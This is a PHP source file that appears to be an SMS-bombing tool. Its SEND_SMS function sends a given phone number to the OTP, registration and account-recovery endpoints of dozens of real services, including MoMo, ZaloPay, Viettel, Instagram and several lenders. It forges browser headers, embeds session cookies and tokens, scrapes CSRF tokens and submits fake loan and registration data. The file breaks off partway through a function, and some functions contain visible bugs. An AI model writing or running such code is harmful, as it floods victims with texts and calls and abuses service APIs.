<?php
error_reporting(0);
session_start();
header('content-type: application/json');

function SEND_SMS($phone)
{
$SEND_SMS = array();
$SEND_SMS = MONEYVEO($phone);/// otp callllll
$SEND_SMS = VAYVND($phone);///send otp/////////
$SEND_SMS = ROBOCASH($phone);/// otp callllll//
$SEND_SMS = LOSHIP($phone);//send otp
$SEND_SMS = TUOITRE($phone);///send otp
$SEND_SMS = ATM($phone);///send otp
$SEND_SMS = VIEON($phone);//send otp
$SEND_SMS = DONGPLUS($phone);///otp call
$SEND_SMS = TIENOI($phone);//otp call
$SEND_SMS = F88($phone);//send otp
$SEND_SMS = TAMO($phone);///send otp
$SEND_SMS = META($phone);///send otp
$SEND_SMS = VIETTELL($phone);///send otp
$SEND_SMS = VETTELL2($phone);//send otp
$SEND_SMS = ZALOPAY($phone);//send otp
$SEND_SMS = VTPAY($phone);///send otp
$SEND_SMS = MOMO($phone);//otp call
$SEND_SMS = FPTSHOP($phone);//send otp
$SEND_SMS = TV360($phone);//send otp
$SEND_SMS = POPS($phone);//send otp
$SEND_SMS = VAYSIEUDE($phone);///send otp
$SEND_SMS = THANTAIOI($phone);///otp call
$SEND_SMS = MCREDIT($phone);///send otp
$SEND_SMS = CAYDENTHAN($phone);//otp call
$SEND_SMS = DAIHOCFPT($phone);///send otp
$SEND_SMS = CAFELAND($phone);
$SEND_SMS = FINDO($phone);
$SEND_SMS = ONCREDIT($phone);
$SEND_SMS = AHAMOVE($phone);
$SEND_SMS = MONEYDONG($phone);
$SEND_SMS = FUNRING($phone);
$SEND_SMS = WINMART($phone);
$SEND_SMS = OLDFACEBOOK($phone);
$SEND_SMS = VAMO($phone);
$SEND_SMS = VIETID($phone);
$SEND_SMS = GOTADI($phone);
$SEND_SMS = CONCUNG($phone);
$SEND_SMS = UBOFOOD($phone);
return json_encode($SEND_SMS, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}

function UBOFOOD($phone) {
    $headers = array(
        "Host: ubofood.com",
        "Connection: keep-alive",
        "Content-Length: 54",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://ubofood.com",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://ubofood.com/register",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9",
        "Cookie: ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22771%22%2C%22name%22%3A%22Qu%E1%BA%ADn%2010%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2227199%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%2005%22%7D%2C%22text%22%3A%22132%20Ng%C3%B4%20Quy%E1%BB%81n%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.76224577192127%2C%22lng%22%3A106.66505889999999%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A50.44Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ0ODAxOTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.tZKNt4tPQ-9rMtFyEhnahBHVBbiaaDnkSVU6KZFYhjc5eOxonkUhZ7wRN9CttwFlS2wcD-TnYy3J510OGzPW_G_AhFWuunUzw5tp9VZtIj7c1n_xIZ3HkhLOeUftWMJqtepKEfT-HQgE3PZuHyKzbINm44DaV8he6NnqqFdrg8oSoZXHq9HesLmDdKXV1xv3pJmPb3lg6MNISW9uA3fg0tSpsbJP6-BfgHTwEGcRaGrCnVBBjqr6HoVkEbw-_2peISNwNONC_vld7z6IN3b9BxHPjPhiOKMNxYLuQw-r4EcU69GiWyIERX1Osv-f9pNvMcWJJM011nb7xTKro0sAeLlJyCThVIkx4NH8l_0zY3P0BuvHWtz9pX_jQBMurSI-lTm15sDOEmGP3LVAbteTVZuiY4xvfqUUxeC_CLYt7NwHAa7vILUvME3O8L8xmnAjvqjkxplzMmsjQOxGsIYgZ1kW_WG8bXTRx69oADfTtV6Gowllags3GfhsE4ThWxHusuU9S6LCag-LXKUnho0bzxbju-4-lwrCuduSNXqTXET0_fNX4hsrj2BbroDG5710j66kzLq7Nh2Td08m7RWUf2ALpAF88CoR8m6qTOF0E_XO8a5Y0qFcbevbtKmBVqV0YiCfkXXW9ceD0yFO_AJGwVWea6dCCVg2dVWg7jP9-HY",
        "_gcl_au=1.1.1777292794.1682944193",
        "_ga=GA1.1.962990047.1682944194",
        "_fbp=fb.1.1682944194191.2034199897",
        "_tt_enable_cookie=1",
        "_ttp=NECdknStPnwSILo-MDYYWVVd3RG",
        "_ga_KCGG79N4SY=GS1.1.1682944193.1.1.1682944197.0.0.0",
        "_ga_3PKTQRQF3P=GS1.1.1682944193.1.1.1682944198.0.0.0"
    );
    $data = array(
        "phone_number" => $phone,
        "trade_code" => "379760000"
    );
    $datason = json_encode($data);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "https://ubofood.com/api/v1/account/customers/register");
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $datason);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    $json_result = json_decode($result, true);
    if ($json_result['status'] == 200) {
        return true;
	 } else {
		  return false;
   }
}
function CONCUNG($phone) {
  $headers = array(
    "Host: concung.com",
    "content-length: 121",
    "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept: */*",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with: XMLHttpRequest",
    "sec-ch-ua-mobile: ?1",
    "user-agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform: \"Android\"",
    "origin: https://concung.com",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: cors",
    "sec-fetch-dest: empty",
    "referer: https://concung.com/dang-nhap.html",
    "accept-encoding: gzip, deflate, br",
    "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    "cookie: _ga_BBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0"
  );
  $postData = http_build_query(array(
    "ajax" => "1",
    "classAjax" => "AjaxLogin",
    "methodAjax" => "sendOtpLogin",
    "customer_phone" => $phone,
    "id_customer" => "0",
    "momoapp" => "0",
    "back" => "khach-hang.html"
  ));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://concung.com/ajax.html");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLINFO_HEADER_OUT, true);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  $response = curl_exec($ch);
  $info = curl_getinfo($ch);
  curl_close($ch);
  if ($info['http_code'] == 200) {
    return true;
	 } else {
		  return false;
   }
}

function GOTADI($phone) {
  $headers = array(
    "Host: api.gotadi.com",
    "content-length: 44",
    "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept: application/json",
    "sec-ch-ua-platform: \"Android\"",
    "gtd-client-tracking-device-id: 85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile: ?1",
    "user-agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type: application/json",
    "origin: https://www.gotadi.com",
    "sec-fetch-site: same-site",
    "sec-fetch-mode: cors",
    "sec-fetch-dest: empty",
    "referer: https://www.gotadi.com/",
    "accept-encoding: gzip, deflate, br",
    "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
  );
  $postData = array(
    "phoneNumber" => $phone,
    "language" => "VI"
  );
  $data = json_encode($postData);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLINFO_HEADER_OUT, true);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  $response = curl_exec($ch);
  $info = curl_getinfo($ch);
  curl_close($ch);
  if ($info['http_code'] == 200) {
      return true;
	 } else {
		  return false;
   }
}
function VIETID($phone) {
    // first, perform a GET request to the login page to retrieve the csrf token
    $url = 'https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F';
    $csrfget = curl_init();
    curl_setopt_array($csrfget, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => array(
            "User-Agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "Accept-Encoding: gzip, deflate, br",
        ),
    ));
    $csrfget_response = curl_exec($csrfget);
    $csrfget_error = curl_error($csrfget);
    curl_close($csrfget);

    if ($csrfget_error) {
        // handle error
    } else {
        // extract the csrf token from the response
        $csrf = explode('name="csrf-token" value="', $csrfget_response)[1];
        $csrf = explode('"', $csrf)[0];

        // now, post the phone number and the csrf token to the login page to actually log in
        $url = 'https://oauth.vietid.net/rb/login';
        $payload = array('authenticity_token' => $csrf, 'phone' => $phone);
        $header = array(
            "User-Agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: */*",
            "Referer: https://oauth.vietid.net/rb/login",
            "Accept-Encoding: gzip, deflate, br",
        );
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => http_build_query($payload),
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 0,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        ));
        $response = curl_exec($curl);
        $error = curl_error($curl);
        $status_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);

        if ($error) {
            // handle error
        } else {
            if ($status_code == 200) {
                 return true;
	            } else {
		        return true;
          	}
        }
    }
}function VAMO($phone) {
    $headers = array(
        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
        "Cookie: _ga_1HXSGSN1HG\u003dGS1.1.1683203760.3.1.1683203783.0.0.0"
    );
    $data = json_encode(array("username" => substr($phone, 1, 10)));
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => implode("\r\n", $headers),
            "content" => $data,
        ),
    );
    $context = stream_context_create($options);
    $response = file_get_contents("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", false, $context);

    if (strpos($http_response_header[0], '200') !== false) {
       return true;
	    } else {
		  return false;
	}
}function OLDFACEBOOK($phone) {
    $url = "https://www.instagram.com/accounts/account_recovery_send_ajax/";
    $data = "email_or_username=" . urlencode($phone) . "&recaptcha_challenge_field=";
    $headers = array(
        "Content-Type: application/x-www-form-urlencoded",
        "X-Requested-With: XMLHttpRequest",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken: EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    );
    $opts = array(
        "http" => array(
            "method" => "POST",
            "header" => implode("\r\n", $headers),
            "content" => $data
        )
    );
    $context = stream_context_create($opts);
    $response = file_get_contents($url, false, $context);
    
    if (strpos($http_response_header[0], '200') !== false) {
      return true;
	    } else {
		  return false;
	}
}
function WINMART($phone) {
    $url = "https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=" . urlencode($phone);
    $response = file_get_contents($url);
    if (strpos($http_response_header[0], '200') !== false) {
        return true;
	    } else {
		  return false;
	}
}

function FUNRING($phone){
    $Headers = array(
        "Host: funring.vn",
        "Connection: keep-alive",
        "Content-Length: 28",
        "Accept: */*",
        "User-Agent: Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type: application/json",
        "Origin: http://funring.vn",
        "Referer: http://funring.vn/module/register_mobile.jsp",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga=GA1.2.1626827841.1679236846; _gid=GA1.2.888694467.1679236846; _gat=1"
    );
    $Data = "username=".$phone;
    $GET = curl("POST", "https://funring.vn/api/v1.0.1/jersey/user/getotp", $Data, $Headers, true);
    if ($GET["succeed"] == 200) {
       return false;
	    } else {
		  return true;
	}
}function MONEYDONG($phone) {
    $headers = array(
        "Host: moneydong.vn",
        "accept: */*",
        "x-requested-with: XMLHttpRequest",
        "traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "referer: https://moneydong.vn/vi/registernew/",
    );

    $get = CURL("GET", "https://moneydong.vn/vi/registernew/", null, $headers, true);

    $ck = explode(";", explode("set-cookie: ", $get)[1])[0].";";

    $data = 'phoneNumber='.$phone;

    $headers = array(
        "Host: moneydong.vn",
        "accept: */*",
        "x-requested-with: XMLHttpRequest",
        "traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "referer: https://moneydong.vn/vi/registernew/",
        "cookie: ".$ck
    );

    $access = CURL("POST", "https://moneydong.vn/vi/registernew/sendsmsjson/", $data, $headers, false);

    if ($access["succeed"] == "true" or $GET["succeed"] == 1) {
      return false;
	    } else {
		  return true;
	}
}function VAYSIEUDE($phone){
	$head = array(
		"Host: vaysieude.com",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://vaysieude.com",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://vaysieude.com/?click_id=643f76517a519600011858c1",
		"cookie: XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
	);
	$get = CURL("GET", "https://vaysieude.com/?click_id=643f76517a519600011858c1", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $get)[1])[0];
	$data = http_build_query(array(
		"_token" => $token,
		"loan[loan_amount]" => "20000000",
		"loan[full_name]" => "Không biết",
		"loan[identity]" => "123456789",
		"loan[phone]" => $phone
	));
	$get = CURL("POST", "https://vaysieude.com/?click_id=643f76517a519600011858c1", $data, $head, false);
	if (strpos ($get, "An Error Occurred: Method Not Allowed") !== false){
		return false; 
	} else {
		return true; 
	}
}
function AHAMOVE($phone) {
   $headers = array(
        "Host: api.ahamove.com",
        "cache-control: max-age=0",
        "upgrade-insecure-requests: 1",
        "origin: https://app.ahamove.com",
        "content-type: application/json;charset=UTF-8",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept: application/json, text/plain, */*",
        "referer: https://app.ahamove.com/",
        "accept-encoding: gzip, deflate, br",
        "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    );
   $mail = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 6) . '@gmail.com';
   $data = [
        'mobile' => $phone,
        'name' => 'Tuấn',
        'email' => $mail,
        'country_code' => 'VN',
        'firebase_sms_auth' => true
      ];
	$get = CURL("POST", "https://api.ahamove.com/api/v3/public/user/register", $data_json, $headers, false);
	if (strpos ($get, "Fake email or invalid format of phone number") !== false){
		return false; 
	} else {
		return true; 
	}
}


function THANTAIOI($phone){///calll
	$phone = "84".$phone;
	$phone = "84".str_replace("840", "", $phone);
	$head = array(
		"Host: api.thantaioi.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://thantaioi.vn",
		"referer: https://thantaioi.vn/",
	);
	$data = '{"full_name":"THAI NGUYEN","first_name":"pro","last_name":"Nguyên","mobile_phone":"'.$phone.'","target_url":"caydenthan.vn/"}';
	$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user", $data, $head, false),true);
	$token = $get["token"];
	if($token){
		$head = array(
			"Host: api.thantaioi.vn",
			"accept-language: vi",
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
			"content-type: application/json",
			"authorization: Bearer ".$token,
			"accept: */*",
			"origin: https://thantaioi.vn",
			"referer: https://thantaioi.vn/",
		);
		$get = json_decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", null, $head, false),true);
	} else {
		$data = '{"phone":"'.$phone.'"}';
		$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user/send-one-time-password", $data, $head, false),true);
	}
	if($get["phone_confirmation_type"] == "missed_call"){
		return true; 
	} else {
		return false; 
	}
}



function MCREDIT($phone){
	$head = array(
		"Host: mcredit.com.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json; charset=UTF-8",
		"origin: https://mcredit.com.vn",
		"referer: https://mcredit.com.vn/",
	);
	$data = '"'.$phone.'"';
	$get = CURL("POST", "https://mcredit.com.vn/api/Customers/requestOTP", $data, $head, false);
	if($get == ""){
		return true; 
	} else {
		return false; 
	}
}
function CAYDENTHAN($phone){///calll
	$phone = "84".$phone;
	$phone = "84".str_replace("840", "", $phone);
	$head = array(
		"Host: api.caydenthan.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://caydenthan.vn",
		"referer: https://caydenthan.vn/",
	);
	$data = '{"full_name":"THAI NGUYEN","first_name":"pro","last_name":"Nguyên","mobile_phone":"'.$phone.'","target_url":"caydenthan.vn/"}';
	$get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", $data, $head, false),true);
	$token = $get["token"];
	if($token){
		$head = array(
			"Host: api.caydenthan.vn",
			"accept-language: vi",
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
			"content-type: application/json",
			"authorization: Bearer ".$token,
			"accept: */*",
			"origin: https://caydenthan.vn",
			"referer: https://caydenthan.vn/",
		);
		$get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", null, $head, false),true);
	} else {
		$data = '{"phone":"'.$phone.'"}';
		$get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", $data, $head, false),true);
	}
	if($get["phone_confirmation_type"] == "missed_call"){
		return true; 
	} else {
		return false; 
	}
}
function DAIHOCFPT($phone){
	$head = array(
		"Host: daihoc.fpt.edu.vn"*
		"accept: */*"*
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://daihoc.fpt.edu.vn",
		"referer: https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/"
	);
	$data = "firstname=Nguyên&mobilephone=".$phone."&email=tenhkhong3%40gmail.com&city_id=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&ldp_id=tuyen-sinh-dh-fpt&utm_source=&utm_medium=&utm_campaign=&utm_term=&url_referer=&utm_cpname=&utm_adscampaign=&script_uri=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&type_register=";
	$get = CURL("POST", "https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php", $data, $head, false);
	$get = CURL("GET", "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile=".$phone."&resend_opt=1", null, $head, false);
	if (strpos ($get, $phone) !== false){
		return true; 
	} else {
		return false; 
	}
}
function CAFELAND($phone){
	$head = array(
		'Host: nhadat.cafeland.vn',
		'accept: application/json, text/javascript, */*; q=0.01',
		'x-requested-with: XMLHttpRequest',
		'user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
		'content-type: application/x-www-form-urlencoded; charset=UTF-8',
		'origin: https://nhadat.cafeland.vn',
		'referer: https://nhadat.cafeland.vn/dang-ky.html',
		'cookie: _fbp=fb.1.1681635921620.1153873944;__zi=2000.SSZzejyD6zyjZ_AYrmnPo2t9yFR9GbVGRvNY_DTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravel_session=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
	);
	$get = CURL("GET", "https://nhadat.cafeland.vn/dang-ky.html", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $get)[1])[0];
	$data = "mobile=".$phone."&_token=".$token;
	$get = json_decode(CURL("POST", "https://nhadat.cafeland.vn/member-send-otp/", $data, $head, false),true);
	if($get["active_check"] == "1" or $get["active_check"] == "true"){
		return true; 
	} else {
		return false; 
	}
}
function FINDO($phone){
	$head = array(
		"Host: api.findo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.findo.vn",
		"referer: https://www.findo.vn/",
	);
	$data = '{"mobilePhone":{"number":"'.$phone.'"}}';
	$get = json_decode(CURL("POST", "https://api.findo.vn/web/public/client/phone/sms-code-ts", $data, $head, false),true);
	if($get["data"][0] == ""){
		return true; 
	} else {
		return false; 
	}
}
function ONCREDIT($phone){///call
	$head = array(
		"Host: oncredit.vn",
		"accept: application/json, text/javascript, */*; q=0.01",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://oncredit.vn",
		"referer: https://oncredit.vn/registration",
